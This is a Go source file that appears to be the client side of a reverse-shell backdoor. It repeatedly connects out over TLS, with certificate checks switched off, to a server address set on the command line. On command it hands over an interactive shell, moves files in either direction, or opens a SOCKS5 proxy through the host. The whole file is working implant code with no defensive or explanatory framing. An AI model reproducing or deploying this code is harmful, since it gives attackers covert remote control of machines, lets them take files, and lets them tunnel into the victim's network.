package main

import (
	"./shell"
	"crypto/tls"
	"flag"
	"net"
	"runtime"
	"strings"
	"time"
)

var(
	serverHost string
	serverPort string
	waitTime int64
)

func init(){

	flag.StringVar(&serverHost, "h", "192.168.1.1", "server ip")

	flag.StringVar(&serverPort, "p", "8081", "server port")

	flag.Int64Var(&waitTime, "t", 10, "reconnect wait time")

}

func HandleClientConnection(conn net.Conn) {
	defer conn.Close()

	actionChannel := make([]byte, 128)

	osName := runtime.GOOS

	_, _ = conn.Write([]byte(osName))

	read_len, err := conn.Read(actionChannel)

	if err != nil {
		return
	}

	action := strings.TrimSpace(string(actionChannel[:read_len]))

	if read_len == 0 {
		return
	}else if  action == "shell" {
		shell.GetInteractiveShell(conn)
	}else if  action == "upload" {
		shell.UploadFile(conn)
	}else if  action == "download" {
		shell.DownloadFile(conn)
	}else if  action == "socks" {
		println("socks5")
		shell.RunSocks5Proxy(conn)
	}
}

func start(){

	for{
		time.Sleep(time.Duration(waitTime) * time.Second)

		remote := serverHost+":"+serverPort

		config := &tls.Config{InsecureSkipVerify: true}

		conn, err := tls.Dial("tcp", remote, config);
		if err != nil {
			continue
		}

		go HandleClientConnection(conn)

	}

}



func main() {
	flag.Parse()
	start()
}
